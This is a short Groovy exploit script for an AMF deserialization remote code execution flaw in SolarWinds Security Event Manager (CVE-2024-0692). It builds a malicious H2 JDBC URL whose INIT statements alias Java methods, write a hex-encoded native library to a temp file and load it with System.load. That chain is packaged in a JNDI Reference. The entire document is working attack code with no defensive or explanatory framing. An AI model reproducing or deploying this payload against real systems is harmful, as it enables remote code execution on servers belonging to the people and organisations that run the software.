import javax.naming.Reference
import javax.naming.StringRefAddr

// SolarWinds Security Event Manager AMF Deserialization RCE (CVE-2024-0692)
// file write + System.load

def prefix = 'test'
def lib_path = '/Users/exp10it/exp.so'

def list = []

// drop the previous alias if exists
list << "DROP ALIAS IF EXISTS CREATE_FILE"
list << "DROP ALIAS IF EXISTS WRITE_FILE"
list << "DROP ALIAS IF EXISTS INVOKE_METHOD"
list << "DROP ALIAS IF EXISTS INVOKE_STATIC_METHOD"
list << "DROP ALIAS IF EXISTS CLASS_FOR_NAME"

// alias some external Java methods
list << "CREATE ALIAS CREATE_FILE FOR 'java.io.File.createTempFile(java.lang.String, java.lang.String)'"
list << "CREATE ALIAS WRITE_FILE FOR 'org.apache.commons.io.FileUtils.writeByteArrayToFile(java.io.File, byte[], boolean)'"
list << "CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'"
list << "CREATE ALIAS INVOKE_STATIC_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeExactStaticMethod(java.lang.Class, java.lang.String, java.lang.Object)'"
list << "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'"

// use java.io.File.createTempFile() to create a blank file with `.so` extension
list << "SET @file=CREATE_FILE('$prefix', '.so')"

// read native library file and encode it to hex
def content = new File(lib_path).bytes.encodeHex().toString()
// split it into several chunks to avoid SQL length limit
def data = content.toList().collate(500)*.join()

// write the chunks to the file (append mode)
for (d in data) {
   list << "CALL WRITE_FILE(@file, X'$d', TRUE)"
}

// invoke file.getAbsolutePath() to get the absolute path of the temp file
list << "SET @path=INVOKE_METHOD(@file, 'getAbsolutePath', NULL)"
// invoke java.lang.System.load() to load the native library
list << "SET @clazz=CLASS_FOR_NAME('java.lang.System')"
list << "CALL INVOKE_STATIC_METHOD(@clazz, 'load', @path)"

// use INIT property to execute multi SQL statements, and each statement must be separated by `\;`
def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"

def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

return ref